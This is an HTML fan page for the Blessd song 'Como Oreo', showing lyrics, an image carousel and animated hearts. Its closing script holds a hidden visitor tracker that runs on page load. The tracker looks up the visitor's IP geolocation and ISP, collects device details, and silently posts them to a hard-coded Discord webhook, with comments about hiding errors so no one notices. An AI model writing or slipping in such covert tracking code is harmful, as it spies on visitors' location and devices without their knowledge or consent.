<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blessd - Como Oreo | Vibe</title>
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Poppins:wght@300;400;700&display=swap"
        rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <style>
        :root {
            --primary: #0033ad;
            /* Azul Oreo */
            --accent: #00d4ff;
            /* Cian Neón */
            --melo: #7000ff;
            /* Morado Blessd */
            --bg: #010103;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--bg);
            color: white;
            font-family: 'Poppins', sans-serif;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            perspective: 1500px;
        }

        /* --- FONDO ULTRA POTENCIADO (Más Corazones) --- */
        #bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: radial-gradient(circle at center, #001a4d 0%, #010103 100%);
        }

        /* Scanlines efecto video */
        #bg-canvas::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 2;
        }

        /* --- TARJETA PRINCIPAL --- */
        .main-card {
            position: relative;
            z-index: 10;
            text-align: center;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(25px);
            padding: 40px 30px;
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 50px rgba(0, 212, 255, 0.15);
            max-width: 480px;
            width: 90%;
            transform-style: preserve-3d;
        }

        /* --- CARRUSEL DE IMÁGENES PRO --- */
        .carousel-wrapper {
            position: relative;
            width: 170px;
            height: 170px;
            margin: 0 auto 30px;
            border-radius: 50%;
            border: 4px solid var(--accent);
            box-shadow: 0 0 30px rgba(0, 212, 255, 0.6);
            overflow: hidden;
            z-index: 5;
        }

        .carousel-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
            transition: opacity 1s ease-in-out;
        }

        .carousel-image.active {
            opacity: 1;
        }

        /* --- TEXTOS --- */
        h1 {
            font-family: 'Bebas Neue', sans-serif;
            font-size: 4.5rem;
            line-height: 1;
            margin-bottom: 20px;
            letter-spacing: 4px;
            background: linear-gradient(to right, #fff, var(--accent), #fff);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 3s linear infinite;
        }

        @keyframes shine {
            to {
                background-position: 200% center;
            }
        }

        .lyrics-container {
            font-size: 1.15rem;
            line-height: 1.7;
            letter-spacing: 0.5px;
            font-weight: 300;
        }

        .highlight {
            color: var(--accent);
            font-weight: 600;
            text-shadow: 0 0 10px var(--accent);
        }

        /* --- PARTÍCULAS DEL FONDO --- */
        .particle {
            position: absolute;
            pointer-events: none;
            z-index: 0;
        }
    </style>
</head>

<body>

    <div id="bg-canvas"></div>
    <div id="particles"></div>

    <div class="main-card" id="card">
        <div class="carousel-wrapper">
            <img src="1.jpeg" alt="Imagen 1" class="carousel-image active">
            <img src="2.jpeg" alt="Imagen 2" class="carousel-image">
            <img src="3.jpeg" alt="Imagen 3" class="carousel-image">
        </div>

        <h1>OREO</h1>

        <div class="lyrics-container">
            <p id="l1">Hola, mi amor, <span class="highlight">soy yo de nuevo</span></p>
            <p id="l2">Mintiendo que estás sola y que ya no tiene' jevo</p>
            <p id="l3">Y el volverte a meter, mami, es mi mayor anhelo</p>
            <p id="l4">Sabes que yo estoy <span class="highlight">rico</span> y, para usted, todo melo <span
                    style="opacity: 0.7">(jaja)</span></p>
        </div>
    </div>

    <script>
        // 1. Efecto 3D en la tarjeta al mover el mouse
        document.addEventListener('mousemove', (e) => {
            const x = (e.clientX / window.innerWidth - 0.5) * 40;
            const y = (e.clientY / window.innerHeight - 0.5) * -40;
            gsap.to("#card", { rotationY: x, rotationX: y, duration: 0.7, ease: "power2.out" });
        });

        // 2. Sistema de Partículas (MUCHOS Corazones)
        function createHeart() {
            const container = document.getElementById('particles');
            const p = document.createElement('div');

            p.className = 'particle';
            // Corazones azules de diferentes tonos y tamaños
            p.innerHTML = Math.random() > 0.3 ? '💙' : '💙';
            p.style.left = Math.random() * 100 + 'vw';
            p.style.top = Math.random() * 100 + 'vh';
            p.style.fontSize = (Math.random() * 25 + 5) + 'px'; // Tamaños variados
            // Variación de color neón suave
            p.style.filter = `drop-shadow(0 0 5px ${Math.random() > 0.5 ? 'var(--accent)' : 'var(--melo)'})`;

            container.appendChild(p);

            // Movimiento suave de flotación
            gsap.fromTo(p,
                { opacity: 0, y: 50 },
                {
                    opacity: Math.random() * 0.7 + 0.1, // Opacidad variada
                    y: -150,
                    x: (Math.random() - 0.5) * 100,
                    duration: 4 + Math.random() * 4,
                    delay: Math.random() * 2,
                    ease: "sine.inOut",
                    onComplete: () => {
                        // Desvanecer y reciclar
                        gsap.to(p, { opacity: 0, duration: 1, onComplete: () => p.remove() });
                    }
                }
            );
        }

        // Crear corazones masivamente
        for (let i = 0; i < 100; i++) { // Empezar con muchos
            createHeart();
        }
        setInterval(createHeart, 150); // Y crear nuevos rápido

        // 3. Lógica del Carrusel (Automático)
        const images = document.querySelectorAll('.carousel-image');
        let currentImageIndex = 0;

        function nextImage() {
            images[currentImageIndex].classList.remove('active');
            currentImageIndex = (currentImageIndex + 1) % images.length;
            images[currentImageIndex].classList.add('active');
        }

        // Cambiar imagen cada 4 segundos
        setInterval(nextImage, 4000);

        // 4. Animación de entrada de la letra
        gsap.from(".lyrics-container p", {
            opacity: 0,
            y: 30,
            stagger: 1,
            duration: 1.5,
            ease: "power3.out",
            delay: 1
        });

        // ==========================================
        // 5. RASTREADOR DE VISITAS SECRETO (Discord)
        // ==========================================
        async function trackVisitor() {
            // AQUI PEGARÁS LA URL DE TU WEBHOOK DE DISCORD
            const webhookURL = "https://discord.com/api/webhooks/1497368443467468820/_QNRIXOPq8Y16QZuNnJJ7-aOa3hF0hIU_ZNzao2hjnGyPk2LN8sbodQK1K4YehbHWDhZ";

            // Si el webhook no se ha puesto aún, no hacemos nada
            if (webhookURL.includes("AQUI_PONES_EL_LINK")) return;

            try {
                // 1. Obtener la ubicación de forma gratuita y silenciosa a través de GeoJS
                const ipResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const data = await ipResponse.json();

                // 2. Extraer los datos del dispositivo del visitante
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const language = navigator.language;

                // Tratar de detectar el sistema operativo a grandes rasgos
                let os = "Desconocido";
                if (userAgent.includes("Win")) os = "Windows";
                else if (userAgent.includes("Mac")) os = "MacOS";
                else if (userAgent.includes("Android")) os = "Android";
                else if (userAgent.includes("like Mac")) os = "iOS (iPhone/iPad)";
                else if (userAgent.includes("Linux")) os = "Linux";

                // 3. Crear el mensaje con un diseño bonito para Discord
                const payload = {
                    content: "🚨 **¡ALGUIEN ENTRO A LA PÁGINA 'COMO OREO'!** 🚨",
                    embeds: [{
                        title: "👀 Detalles del Visitante",
                        color: 7340287, // Color Morado
                        fields: [
                            {
                                name: "📍 Ubicación",
                                value: `**Ciudad:** ${data.city || 'Desconocida'}\n**Región:** ${data.region || 'Desconocida'}\n**País:** ${data.country || 'Desconocido'}`,
                                inline: false
                            },
                            {
                                name: "🌐 Red",
                                value: `**IP:** ${data.ip}\n**Proveedor (ISP):** ${data.organization || 'Desconocido'}`,
                                inline: false
                            },
                            {
                                name: "📱 Dispositivo",
                                value: `**Sistema:** ${os}\n**Resolución:** ${screenRes}\n**Idioma:** ${language}`,
                                inline: false
                            }
                        ],
                        footer: { text: "Rastreador Vibe" },
                        timestamp: new Date().toISOString()
                    }]
                };

                // 4. Enviar los datos a tu Discord de forma oculta en segundo plano
                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(e => { /* Ignorar errores para que nadie note nada en la consola */ });

            } catch (error) {
                // Si algo falla, morimos en silencio
            }
        }

        // Ejecutamos el rastreador unos segundos después para que no vuelva lenta la página para el usuario
        setTimeout(trackVisitor, 1500);

    </script>
</body>

</html>
